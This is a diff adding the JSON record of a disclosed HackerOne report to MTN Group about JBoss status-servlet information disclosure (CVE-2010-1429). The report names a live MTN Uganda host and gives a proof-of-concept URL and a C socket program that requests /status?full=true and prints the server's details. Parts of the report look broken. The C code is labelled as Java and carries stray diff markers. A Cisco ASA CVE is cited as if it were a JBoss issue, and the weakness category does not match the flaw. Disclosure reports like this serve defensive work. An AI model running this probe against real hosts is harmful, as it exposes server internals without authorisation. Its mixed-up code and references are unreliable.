@@ -1,0 +1,129 @@
+{
+  "id": 2375659,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yMzc1NjU5",
+  "url": "https://hackerone.com/reports/2375659",
+  "title": "CVE-2010-1429 JBoss Insecure Storage of Sensitive Information on ips.mtn.co.ug",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "high",
+  "readable_substate": "Resolved",
+  "created_at": "2024-02-15T20:52:36.382Z",
+  "submitted_at": "2024-02-15T20:52:36.605Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": true,
+    "username": "deb0con",
+    "url": "/deb0con",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/rshtzgfzd3aqze11wxoban88t79d/3cb67cc78dc0cba55b102dd9eca2ee89b206d3e960be830f070583d9070b69ef"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 41919,
+    "url": "https://hackerone.com/mtn_group",
+    "handle": "mtn_group",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/4e6ikuxrt34g8b14w2bk53c6vyry/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/4e6ikuxrt34g8b14w2bk53c6vyry/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "MTN Group",
+      "twitter_handle": "",
+      "website": "https://www.mtn.com/",
+      "about": ""
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [
+    "CVE-2008-3273",
+    "CVE-2018-0296",
+    "CVE-2010-1429"
+  ],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2024-08-30T16:28:31.786Z",
+  "bug_reporter_agreed_on_going_public_at": "2024-07-31T16:28:30.320Z",
+  "team_member_agreed_on_going_public_at": null,
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "## Summary:\nRed Hat JBoss Enterprise Application Platform (aka JBoss EAP or JBEAP) 4.2 before 4.2.0.CP09 and 4.3 before 4.3.0.CP08 allows remote attackers to obtain sensitive information about \"deployed web contexts\" via a request to the status servlet, as demonstrated by a full=true query string. this issue exists because of a CVE-2008-3273 regression. by requesting the Status param and sitting its value to true, Jobss will print a sensitive information such as Memory used/Total Memory / Client IP address. \n\n\n\n## Proof of concept\n  1. Navigate intercept / visit hostserver on https://h30f.n1.ips.mtn.co.ug/status?full=true\n  1. You can see on the page is sensitive has exposed\n  1. Bellow of vulnerable code\n\n```java\n#include <stdio.h>\n#include <string.h>\n#include <stdlib.h>\n#include <unistd.h>\n#include <fcntl.h>\n#include <netinet/tcp.h>\n#include <sys/socket.h>\n#include <sys/types.h>\n#include <netinet/in.h>\n#include <netdb.h>\n \n \nint socket_connect(char *host, in_port_t port){\n    struct hostent *hp;\n    struct sockaddr_in addr;\n    int on = 1, sock;\n     \n    if((hp = gethostbyname(host)) == NULL){\n        herror(\"gethostbyname\");\n        exit(1);\n    }\n    bcopy(hp->h_addr, &addr.sin_addr, hp->h_length);\n    addr.sin_port = htons(port);\n    addr.sin_family = AF_INET;\n    sock = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);\n    setsockopt(sock, IPPROTO_TCP, TCP_NODELAY, (const char *)&on, sizeof(int));\n     \n    if(sock == -1){\n        perror(\"setsockopt\");\n        exit(1);\n    }\n     \n    if(connect(sock, (struct sockaddr *)&addr, sizeof(struct sockaddr_in)) == -1){\n        perror(\"connect\");\n        exit(1);\n         \n    }\n    return sock;\n}\n \n- #define BUFFER_SIZE 1024\n \nint main(int argc, char *argv[]){\n    int fd;\n    char buffer[BUFFER_SIZE];\n     \n    if(argc < 3){\n-        fprintf(stderr, \"Usage: %s <hostname> <port>\\n\", argv[0]);\n        exit(1);\n    }\n     \n    fd = socket_connect(argv[1], atoi(argv[2]));\n+    write(fd, \"GET /status?full=true\\r\\n\", strlen(\"GET /status?full=true\\r\\n\")); // write(fd, char[]*, len);\n    while(read(fd, buffer, BUFFER_SIZE - 1) != 0){\n         fprintf(stderr, \"%s\", buffer);\n    }\n \n    shutdown(fd, SHUT_RDWR);\n    close(fd);\n    return 0;\n}\n```\n\n## Supporting Material/References:\nThe JBoss Enterprise Application Platform 4.2.0.CP03 and 4.3.0.CP01 updates for Red Hat Enterprise Linux 4 and 5 fixed an issue (CVE-2008-3273) where unauthenticated users were able to access the status servlet; however, a bug fix included in the 4.2.0.CP06 and 4.3.0.CP04 updates re-introduced the issue. A remote attacker could use this flaw to acquire details about deployed web contexts.\n\n  * https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20180606-asaftd\n  * https://nvd.nist.gov/vuln/detail/CVE-2018-0296\n  * https://hackerone.com/reports/378698\n\n## Impact\n\nRed Hat JBoss Enterprise Application Platform could allow a remote attacker to obtain sensitive information, caused by improper restrictions on the status servlet. An attacker could exploit this vulnerability to obtain details about deployed Web contexts and other sensitive information.\nhttps://github.com/advisories/GHSA-x26p-67q3-4mfx",
+  "weakness": {
+    "id": 101,
+    "name": "Insecure Storage of Sensitive Information"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": "2024-08-30T16:28:30.489Z",
+  "allow_singular_disclosure_after": -53303693.42598872,
+  "singular_disclosure_allowed": true,
+  "vote_count": 42,
+  "voters": [
+    "orange303",
+    "shreyaschavhan",
+    "0xoroot",
+    "sisi0x",
+    "ahmed_xyz",
+    "aliyueka",
+    "r1skr1der",
+    "mehdi0x90",
+    "exception",
+    "a7medxd",
+    "and 32 more..."
+  ],
+  "severity": {
+    "rating": "high",
+    "author_type": "User"
+  },
+  "structured_scope": {
+    "databaseId": 34324,
+    "asset_type": "URL",
+    "asset_identifier": "mtn.co.ug",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
